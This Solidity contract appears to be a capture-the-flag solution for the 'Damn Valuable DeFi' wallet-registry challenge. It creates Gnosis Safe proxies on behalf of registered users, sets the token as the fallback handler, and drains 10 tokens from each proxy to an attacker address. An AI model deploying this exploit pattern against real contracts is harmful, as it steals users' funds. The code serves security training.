// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract AttackWalletRegistry {
    address[] public users;
    address attacker;
    DamnValuableToken token;
    GnosisSafeProxyFactory factory;
    IProxyCreationCallback callback;
    address singleton;

    constructor(
        address[] memory _users,
        address _attacker,
        address dvt,
        address _factory,
        address _callback,
        address _singleton
    ) {
        users = _users;
        attacker = _attacker;
        token = DamnValuableToken(dvt);
        factory = GnosisSafeProxyFactory(_factory);
        callback = IProxyCreationCallback(_callback);
        singleton = _singleton;
    }

    function attack() public {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;
            bytes memory gnosisSetup = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                victim,
                1,
                address(0),
                0,
                address(token),
                0,
                0,
                0
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                gnosisSetup,
                0,
                callback
            );

            IERC20(address(proxy)).transfer(attacker, 10 ether);
        }
    }
}
